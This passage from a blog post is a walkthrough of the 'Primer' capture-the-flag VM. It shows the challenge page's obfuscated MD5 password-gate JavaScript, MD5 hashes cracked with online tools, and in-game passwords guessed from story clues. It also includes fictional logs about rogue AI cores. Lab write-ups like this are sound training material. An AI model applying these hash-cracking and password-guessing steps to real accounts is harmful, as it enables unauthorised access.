0xf6a0x4,_0xf6a0x3[8],20,1163531501);_0xf6a0x4=gg(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[13],5,-1444681467);_0xf6a0x7=gg(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[2],9,-51403784);_0xf6a0x6=gg(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[7],14,1735328473);_0xf6a0x5=gg(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[12],20,-1926607734);_0xf6a0x4=hh(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[5],4,-378558);_0xf6a0x7=hh(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[8],11,-2022574463);_0xf6a0x6=hh(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[11],16,1839030562);_0xf6a0x5=hh(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[14],23,-35309556);_0xf6a0x4=hh(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[1],4,-1530992060);_0xf6a0x7=hh(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[4],11,1272893353);_0xf6a0x6=hh(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[7],16,-155497632);_0xf6a0x5=hh(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[10],23,-1094730640);_0xf6a0x4=hh(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[13],4,681279174);_0xf6a0x7=hh(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[0],11,-358537222);_0xf6a0x6=hh(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[3],16,-722521979);_0xf6a0x5=hh(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[6],23,76029189);_0xf6a0x4=hh(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[9],4,-640364487);_0xf6a0x7=hh(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[12],11,-421815835);_0xf6a0x6=hh(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[15],16,530742520);_0xf6a0x5=hh(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[2],23,-995338651);_0xf6a0x4=ii(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[0],6,-198630844);_0xf6a0x7=ii(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[7],10,1126891415);_0xf6a0x6=ii(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[14],15,-1416354905);_0xf6a0x5=ii(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[5],21,-57434055);_0xf6a0x4=ii(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[12],6,1700485571);_0xf6a0x7=ii(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[3],10,-1894986606);_0xf6a0x6=ii(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[10],15,-1051523);_0xf6a0x5=ii(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[1],21,-2054922799);_0xf6a0x4=ii(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[8],6,1873313359);_0xf6a0x7=ii(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[15],10,-30611744);_0xf6a0x6=ii(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[6],15,-1560198380);_0xf6a0x5=ii(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[13],21,1309151649);_0xf6a0x4=ii(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[4],6,-145523070);_0xf6a0x7=ii(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[11],10,-1120210379);_0xf6a0x6=ii(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[2],15,718787259);_0xf6a0x5=ii(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[9],21,-343485551);_0xf6a0x2[0]=add32(_0xf6a0x4,_0xf6a0x2[0]);_0xf6a0x2[1]=add32(_0xf6a0x5,_0xf6a0x2[1]);_0xf6a0x2[2]=add32(_0xf6a0x6,_0xf6a0x2[2]);_0xf6a0x2[3]=add32(_0xf6a0x7,_0xf6a0x2[3]);}function cmn(_0xf6a0x9,_0xf6a0x4,_0xf6a0x5,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb){_0xf6a0x4=add32(add32(_0xf6a0x4,_0xf6a0x9),add32(_0xf6a0x2,_0xf6a0xb));return add32((_0xf6a0x4<<_0xf6a0xa)|(_0xf6a0x4>>>(32-_0xf6a0xa)),_0xf6a0x5);}function ff(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb){return cmn((_0xf6a0x5&_0xf6a0x6)|((~_0xf6a0x5)&_0xf6a0x7),_0xf6a0x4,_0xf6a0x5,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb)}function gg(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb){return cmn((_0xf6a0x5&_0xf6a0x7)|(_0xf6a0x6&(~_0xf6a0x7)),_0xf6a0x4,_0xf6a0x5,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb)}function hh(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb){return cmn(_0xf6a0x5^_0xf6a0x6^_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb)}function ii(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb){return cmn(_0xf6a0x6^(_0xf6a0x5|(~_0xf6a0x7)),_0xf6a0x4,_0xf6a0x5,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb)}function md51(_0xf6a0xa){txt=_0x5cf4[0];var _0xf6a0x11=_0xf6a0xa[_0x5cf4[1]],_0xf6a0x12=[1732584193,-271733879,-1732584194,271733878],_0xf6a0x13;for(_0xf6a0x13=64;_0xf6a0x13<=_0xf6a0xa[_0x5cf4[1]];_0xf6a0x13+=64){md5cycle(_0xf6a0x12,md5blk(_0xf6a0xa[_0x5cf4[2]](_0xf6a0x13-64,_0xf6a0x13)))};_0xf6a0xa=_0xf6a0xa[_0x5cf4[2]](_0xf6a0x13-64);var _0xf6a0x14=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];for(_0xf6a0x13=0;_0xf6a0x13<_0xf6a0xa[_0x5cf4[1]];_0xf6a0x13++){_0xf6a0x14[_0xf6a0x13>>2]|=_0xf6a0xa[_0x5cf4[3]](_0xf6a0x13)<<((_0xf6a0x13%4)<<3)};_0xf6a0x14[_0xf6a0x13>>2]|=0x80<<((_0xf6a0x13%4)<<3);if(_0xf6a0x13>55){md5cycle(_0xf6a0x12,_0xf6a0x14);for(_0xf6a0x13=0;_0xf6a0x13<16;_0xf6a0x13++){_0xf6a0x14[_0xf6a0x13]=0};};_0xf6a0x14[14]=_0xf6a0x11*8;md5cycle(_0xf6a0x12,_0xf6a0x14);return _0xf6a0x12;}function md5blk(_0xf6a0xa){var _0xf6a0x16=[],_0xf6a0x13;for(_0xf6a0x13=0;_0xf6a0x13<64;_0xf6a0x13+=4){_0xf6a0x16[_0xf6a0x13>>2]=_0xf6a0xa[_0x5cf4[3]](_0xf6a0x13)+(_0xf6a0xa[_0x5cf4[3]](_0xf6a0x13+1)<<8)+(_0xf6a0xa[_0x5cf4[3]](_0xf6a0x13+2)<<16)+(_0xf6a0xa[_0x5cf4[3]](_0xf6a0x13+3)<<24)};return _0xf6a0x16;}var hex_chr=_0x5cf4[5][_0x5cf4[4]](_0x5cf4[0]);function rhex(_0xf6a0x11){var _0xf6a0xa=_0x5cf4[0],_0xf6a0x19=0;for(;_0xf6a0x19<4;_0xf6a0x19++){_0xf6a0xa+=hex_chr[(_0xf6a0x11>>(_0xf6a0x19*8+4))&0x0F]+hex_chr[(_0xf6a0x11>>(_0xf6a0x19*8))&0x0F]};return _0xf6a0xa;}function hex(_0xf6a0x2){for(var _0xf6a0x13=0;_0xf6a0x13<_0xf6a0x2[_0x5cf4[1]];_0xf6a0x13++){_0xf6a0x2[_0xf6a0x13]=rhex(_0xf6a0x2[_0xf6a0x13])};return _0xf6a0x2[_0x5cf4[6]](_0x5cf4[0]);}function md5(_0xf6a0xa){return hex(md51(_0xf6a0xa))}function add32(_0xf6a0x4,_0xf6a0x5){return (_0xf6a0x4+_0xf6a0x5)&0xFFFFFFFF}if(md5(_0x5cf4[7])!=_0x5cf4[8]){function add32(_0xf6a0x2,_0xf6a0x1d){var _0xf6a0x1e=(_0xf6a0x2&0xFFFF)+(_0xf6a0x1d&0xFFFF),_0xf6a0x1f=(_0xf6a0x2>>16)+(_0xf6a0x1d>>16)+(_0xf6a0x1e>>16);return (_0xf6a0x1f<<16)|(_0xf6a0x1e&0xFFFF);}};var X;var L=_0x5cf4[9];X=prompt(_0x5cf4[10],_0x5cf4[0]);X=md5(X);if(X===null){window[_0x5cf4[11]]=_0x5cf4[12]};if(X==L){}else {window[_0x5cf4[11]]=_0x5cf4[12]};function ready(_0xf6a0x23){if(document[_0x5cf4[13]]!=_0x5cf4[14]){_0xf6a0x23()}else {document[_0x5cf4[16]](_0x5cf4[15],_0xf6a0x23)}}ready(function(){var _0xf6a0x24=_0x5cf4[17];document[_0x5cf4[20]](_0x5cf4[19])[_0x5cf4[18]]=_0xf6a0x24;});

</SCRIPT>


<p>```</p>

<p>Now this is exactly the code that any sane person would like to read! Thankfully, you don&rsquo;t need to read it, although the comment sure is interesting! I printed the contents of the <code>_0x5cf4</code> variable and there was a lot to see, but I only show the important part:</p>

<p><code>plain
[ '',
  'length',
  'substring',
  'charCodeAt',
  'split',
  '0123456789abcdef',
  'join',
  'hello',
  '5d41402abc4b2a76b9719d911017c592',
  '0d28cba0bd4f26e16d766000d27e49fa',
  '§#/$',
  'location',
  './_.php',
...
</code></p>

<p>I cracked those MD5 hashes, first is <em>hello</em> and second is <em>GOD</em>&hellip;so let&rsquo;s say hello in the input box! I tried &ldquo;helloGOD&rdquo; but that just got me to another scary red page. Entering just &ldquo;GOD&rdquo; worked though!</p>

<p><img class="center" src="/images/pentest/primer/primer_level8b.png" title="&lsquo;primer level 8&rsquo; &lsquo;primer level 8&rsquo;" ></p>

<p>If you glanced at the URL formats beginning at the second challenge, you probably noticed they begin with a number for the level, that keeps going up as you progress (1,2,3 etc.), an underscore, and then what looks like an MD5 hash! I copied all of them to an online cracking site, and here is the pattern:</p>

<p>1st node = 2</p>

<p>2nd = 3</p>

<p>3rd = 5</p>

<p>4th = 7</p>

<p>5th = 11</p>

<p>6th = 13</p>

<p>7th = 17</p>

<p>Following this, I surmised that the next one would be 19, because from the order it appears that next increase should be by 2. The order being: <code>1st to 2nd: +1 &ndash;> 2nd to 3rd: +2 &ndash;> 3rd to 4th: +2 &ndash;> 4th to 5th: +4 &ndash;> 5th to 6th: +2 &ndash;> 6th to 7th: +4</code>. So I constructed the URL for the next level with the hashed value of 19, like this: <code>8_1f0e3dad99908345f7439f8ffabdffc4/</code>.</p>

<p><img class="center" src="/images/pentest/primer/primer_level9.png" title="&lsquo;primer level 9&rsquo; &lsquo;primer level 9&rsquo;" ></p>

<p>By now we know enough to click on the big EOF link :D</p>

<p><img class="center" src="/images/pentest/primer/primer_level10.png" title="&lsquo;primer level 10&rsquo; &lsquo;primer level 10&rsquo;" ></p>

<p>What&rsquo;s this? It looks like a terminal prompt. I entered <em>whoami</em> in it:</p>

<p><img class="center" src="/images/pentest/primer/primer_end.png" title="&lsquo;primer end&rsquo; &lsquo;primer complete&rsquo;" ></p>

<p>Hmmm, scary :D I tried some other other commands too:</p>

<p><img class="center" src="/images/pentest/primer/primer_cli.png" title="&lsquo;primer cli&rsquo; &lsquo;primer cli&rsquo;" ></p>

<p>There is a help command:</p>

<p>``` plain</p>

<p>help
[0]================================================================</p>

<p>ls [dir]</p>

<p>outputs contents of [dir]
prints contents of current directory if no [dir] is specified</p>

<p>[1]================================================================</p>

<p>cd [dir]</p>

<p>changes the current directory to [dir]
outputs current directory if no directory is specified</p>

<p>[2]================================================================</p>

<p>cat [file]</p>

<p>displays the content of [file]</p>

<p>[3]================================================================</p>

<p>ps</p>

<p>displays a list of running processes</p>

<p>[4]================================================================</p>

<p>whoami</p>

<p>displays username</p>

<p>[5]================================================================</p>

<p>clear</p>

<p>deletes terminal command history</p>

<p>[6]================================================================</p>

<p>connect [user]@[host]</p>

<p>connects to a remote host using the credentials of user</p>

<p>[7]================================================================</p>

<p>hash [type] [file|string]</p>

<p>prints the hash of a file or &ldquo;string&rdquo;
supported hash functions are:
md5, sha256, sha1, whirlpool and crc32</p>

<p>[8]================================================================</p>

<p>encode|decode [type] [file|string]</p>

<p>encodes/decodes the file or &ldquo;string&rdquo;
supported encodings are:
uu, gz, base64 and rot13</p>

<p>[9]================================================================</p>

<p>enrypt|decrypt [file|string] [key]</p>

<p>encrypts/decrypts the file or &ldquo;string&rdquo;
```</p>

<p>Next I took a closer look at the AIs&hellip;I meant users! :D</p>

<p><img class="center" src="/images/pentest/primer/chaos.png" title="&lsquo;chaos&rsquo; &lsquo;chaos&rsquo;" ></p>

<p>I thought they were directories but couldn&rsquo;t cd to them. Then I tried cracking the names that look like long hashes of something, but no success. I looked at wintermute next:</p>

<p><img class="center" src="/images/pentest/primer/wintermute.png" title="&lsquo;wintermute&rsquo; &lsquo;wintermute&rsquo;" ></p>

<p>Same thing, the hashes didn&rsquo;t yield anything. Next..</p>

<p><img class="center" src="/images/pentest/primer/zephis.png" title="&lsquo;zephis&rsquo; &lsquo;zephis&rsquo;" ></p>

<p>More hashes, more nothing.</p>

<p><img class="center" src="/images/pentest/primer/willis.png" title="&lsquo;willis&rsquo; &lsquo;willis&rsquo;" ></p>

<p>Some text files! Let&rsquo;s read them!</p>

<p>``` plain
cat log_0001.txt</p>

<p>3rd of July 2028</p>

<p>Working with Falken is amazing. He has a quick mind and is incredibly well informed on recent developements. I don&rsquo;t get why he left Sosu after setting up the Chaos c0re.
They must have offered him a position.</p>

<h2>I&rsquo;m not complaining here, just wondering because we are the only RnD team with unlimited funding and Falken was put in charge after all those years of absence.</h2>

<p>cat log_0002.txt</p>

<p>8th of August 2028</p>

<p>Falken didn&rsquo;t show up today. I&rsquo;m a bit worried because he has been strange lately.
According to the logs he&rsquo;s still logged in&hellip;</p>

<h2>I haven&rsquo;t informed the admins yet. I don&rsquo;t know why&hellip;</h2>

<p>cat log_0003.txt</p>

<p>10th of August 2028</p>

<p>The guys from the mainland called in today. Said some suits will be here tomorrow.
Apparently the Erebus Core started behaving strangely and the kill-switch didn&rsquo;t fire.
Chaos is still locked down. But I have a weird feeling about all this.
Falken disappearing, the incident with Erebus&hellip;
```</p>

<p>Some ominous stuff going down there! Let&rsquo;s check falken:</p>

<p><img class="center" src="/images/pentest/primer/falken.png" title="&lsquo;falken&rsquo; &lsquo;falken&rsquo;" ></p>

<p>More logs!</p>

<p>``` plain
cat log_0001.txt</p>

<p>12th of Juli 2028</p>

<p>My work on getting the old core up and running continues to spark doubt among my colleagues. To be fair, no-one has ever attempted to get a corrupted AI back online.</p>

<h2>But I am confident that I can isolate the malicious parts and rescue the data lost due the crash last year.</h2>

<p>cat log_0002.txt</p>

<p>6th of August 2028</p>

<p>I am getting nowhere fast. If we cannot make the recovery until the end of the month the project will be abandoned and the Sosu core locked down.
A frozen BLOB, lost potential. I won&rsquo;t let that happen!
Today was Joshua&rsquo;s birthday. 44 years, time flies. We spent some time in a bar in Shenzen and talked. A nice Father-Son-Momement. I&rsquo;ve missed those.
It took my mind of things but now that I&rsquo;m here at the desk it all comes back.
I might have to make a bold move&hellip;
```</p>

<p>Well, clearly something went wrong. Restoring a corrupt AI doesn&rsquo;t sound like the best idea. I&rsquo;m getting more curious about this story! :D I checked the running processes next:</p>

<p><img class="center" src="/images/pentest/primer/ps.png" title="&lsquo;ps&rsquo; &lsquo;ps&rsquo;" ></p>

<p>Trying anything with the <em>c0re</em> command gave me an access denied error, but the <em>connect</em> looks interesting! I tried it, but it asked for a password. Damn! At this point, I tried many passwords, trying to glue information from the logs and also tried the previously hinted passwords. It actually took me a long time to score the right one, I had overlooked an easy one! Most of my tries revolved around joshua and something else, but it took me a while to realize I can figure out Joshua&rsquo;s birth date because both his age and the year of the log are given. So 2028 &ndash; 44 = 1984! (no special significance for that, huh :D). So when I tried <code>joshua1984</code>, the screen changed..and we are on Erebus!</p>

<p><img class="center" src="/images/pentest/primer/erebus.png" title="&lsquo;erebus&rsquo; &lsquo;erebus&rsquo;" ></p>

<p>The commands are the same as on the previous host, so let&rsquo;s check the users:</p>

<p><code>
ls /usr
[wintermute] [mccarthy] [falken]
</code></p>

<p>More unintelligible hashes in wintermute, mccarthy looks empty, but Falken has left us more logs :D</p>

<p>``` plain
ls falken
log_0001.<em> log_0002.</em> log_0003.<em> log_0004.</em></p>

<p>cat log_0001._</p>

<p>OXRoIG9mIEF1Z3VzdCAyMDI4CgpJIGhhdmUgam9pbmVkIHRoZSBuZXR3b3JrIGZyb20gaG9tZSBhbmQgY29ubmVjdGVkIHRvIHRoZSBFcmVidXMgc2VydmVyLiBJIHdpbGwgY29udGludWUgbXkgd29yayBmcm9tIGhlcmUgYnV0IEkgd2lsbCBoYXZlIHRvIGJlIG1vcmUgY2FyZWZ1bC4KTm93LCBFcmVidXMgd2FzIHRoZSBzZWNvbmQgQUkgaW5zdGFsbGVkIGFmdGVyIENoYW9zLiBJIHdhc24ndCBwYXJ0IG9mIHRoZSB0ZWFtIGJ1dCBtb3N0IG9mIHRoZSBtZW1iZXJzIHdlcmUgbXkgZnJpZW5kcywgc28gSSBrbm93IG15IHdheSBhcm91bmQgaGVyZS4K
```</p>

<p>Uh-oh, this time it won&rsquo;t be so easy to read them. But it doesn&rsquo;t look as daunting as the ones I couldn&rsquo;t crack..sure enough, it turns out a base64 decode will do the trick! It was faster for me to feed the strings into an online decoder, but you can use the <em>decode</em> command on the server too. Here are the decoded logs:</p>

<p>``` plain
9th of August 2028</p>

<p>I have joined the network from home and connected to the Erebus server. I will continue my work from here but I will have to be more careful. Now, Erebus was the second AI installed after Chaos. I wasn&rsquo;t part of the team but most of the members were my friends, so I know my way around here.</p>

<p>10th of August 2028</p>

<p>Ok, the problem I have with the Chaos c0re is that it&rsquo;s source is shifting too fast. Every time I execute a small part it breaks down or begins to morph and grow in order to replicate functions of different parts. The signaling is also going crazy even on segments that are relatively stable. Signaling to disconnected parts! And reactions to responses that would have but definitely have not been sent&hellip; Am I going crazy or is Chaos experiencing phantom pain?
```</p>

<p>Trying to read the 3rd and 4th logs kicked me out of the terminal or something..after reconnecting, I looked at the running processes:</p>

<p><code>plain
ps
USER     PID    CPU    MEM   COMMAND
root     3251   5.2    3.9    connect falken@TrivialZ3r0
root     2677   33.8   43.8   c0re -t Erebus
nieve    84687  0.8    0.5    ps
</code></p>

<p>Cool, let&rsquo;s follow in Falken&rsquo;s footsteps..uhm, connects. I tried, but the password I had wasn&rsquo;t good! After more password guessing, I figured something suspicious is preventing me from reading the last logs. Also, all those decoding commands on the server must have been given for a reason! It&rsquo;s funny, but if I had just used them from the beginning instead of going to external sites, I might have progressed faster. Anyway, only after I verified that I could read the first 2 logs with the <em>decode</em> command, instead of pasting the strings inside to an online decoder, I thought I should try using it for the remaining logs as well. I cycled through the options until the one that hit the jackpot!</p>

<p>``` plain
decode gz log_0003._</p>

<p>12th of August 2028</p>

<p>I think they might be on to me and I can only change the encoding so often.
I will have to do something reckless&hellip; but not from here, they are already too close
```</p>

<p>So it&rsquo;s Falken messing around that is hindering us..but it seems someone else is after him as well? I tried the same thing with the last log:</p>

<p>``` plain
decode gz log_0004._</p>

<p>PCH ybnq vapernfrq abgvprnoyl, fbzrguvat vf tbvat gb unccra naq V jvyy abg or nebhaq gb jvgarff&hellip; GevivnyM3e0 frrzf gb or dhvrg, qba'g xabj jung'f tbvat ba bire gurer ohg vg pna'g or jbefr guna orvat genprq qbja ol znvaynaq fcbbxf. Svefg V arrq fbzr perqf, gubhtu. Uzz, GevivnyM3e0&hellip; gung erzvaqf zr bs fbzrbar, yrg'f whfg ubcr gubfr thlf nera'g zngu trrxf.
```</p>

<p>That looks like ROT13 to me, and thankfully, we can decode it:</p>

<p>``` plain
decode rot13 &ldquo;PCH ybnq vapernfrq abgvprnoyl, fbzrguvat vf tbvat gb unccra naq V jvyy abg or nebhaq gb jvgarff&hellip; GevivnyM3e0 frrzf gb or dhvrg, qba'g xabj jung'f tbvat ba bire gurer ohg vg pna'g or jbefr guna orvat genprq qbja ol znvaynaq fcbbxf. Svefg V arrq fbzr perqf, gubhtu. Uzz, GevivnyM3e0&hellip; gung erzvaqf zr bs fbzrbar, yrg'f whfg ubcr gubfr thlf nera'g zngu trrxf.&rdquo;</p>

<p>CPU load increased noticeably, something is going to happen and I will not be around to witness&hellip; TrivialZ3r0 seems to be quiet, don&rsquo;t know what&rsquo;s going on over there but it can&rsquo;t be worse than being traced down by mainland spooks. First I need some creds, though. Hmm, TrivialZ3r0&hellip; that reminds me of someone, let&rsquo;s just hope those guys aren&rsquo;t math geeks.
```</p>

<p>I followed the hint that Falken left us and googled for &ldquo;trivial zero&rdquo;. This returned info about a Riemann zeta function and I stopped reading after that because..well, it look complicated, and I thought I already had a good candidate for the password :D I tried connecting again, this time gave <em>Riemann</em> as password..new host, new things to do!</p>

<p><img class="center" src="/images/pentest/primer/trivialzero.png" title="&lsquo;TrivialZ3r0&rsquo; &lsquo;trivialzero&rsquo;" ></p>

<p>This one is a bit different, instead of a user folder, there is a password folder:</p>

<p>``` plain
ls /passwd
falken chaos mccarthy</p>

<p>cat falken</p>

<p>61ea1974dd974297913b1fa2f0470d26</p>

<p>cat chaos</p>

<p>85241de03d1254ac40274b02caafcd99</p>

<p>cat mccarthy</p>

<p>f74bfa0e35e5089a0bb743a893b4c7e3
```</p>

<p>All right, let&rsquo;s get cracking! In the meantime, I looked for where to next:</p>

<p><code>plain
ps
USER     PID    CPU    MEM   COMMAND
root     3251   4.5    2.9    connect chaos@Wintermute
falken   2005   75.3   73.6   c0re -t Chaos
root     2677   87.1   43.2   c0re -t TrivialZ3r0
nieve    26588  0.5    0.5    ps
</code></p>

<p>So it seems we will have to connect as chaos for the next one. I went to <a href="https://hashkiller.co.uk/md5-decrypter.aspx">HashKiller</a> and cracked the hashes as follows: <em>Falken</em>&ndash;<em>Riemann</em> (we already know), <em>Chaos</em>&ndash;<em>2.718281828459045</em> (wouldn&rsquo;t have guessed this one! If you are curious, this is a mathematical constant known as Euler&rsquo;s Number). Couldn&rsquo;t crack McCarthy&rsquo;s. But we have enough to pay Wintermute a visit:</p>

<p><img class="center" src="/images/pentest/primer/wintermute_connected.png" title="&lsquo;Wintermute&rsquo; &lsquo;Wintermute&rsquo;" ></p>

<p>Uhm, there are no more breadcrumbs to follow..and why is there a file called nieve in here? Uh-oh..</p>

<p><img class="center" src="/images/pentest/primer/end.png" title="&lsquo;nieve&rsquo; &lsquo;the end&rsquo;" ></p>

<p>An invitation from the AIs! Much better than a squad of hired assassins that would erase all the tracks of this unfortunate hacker..well then, let&rsquo;s see what awaits on the other side!</p>

<p><img class="center" src="/images/pentest/primer/credits.png" title="&lsquo;credits&rsquo; &lsquo;credits&rsquo;" ></p>

<p>This was such a great VM, one of my favorites! It required less technical know-how and more detective thinking (or story immersion). I highly recommend it, great storyline and atmosphere! Many thanks to Arne Rick for this unconventional challenge!</p>

<p>``` plain</p>

<hr />

<p>/ Don&rsquo;t hate yourself in the morning &mdash; \
\ sleep till noon.                      /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
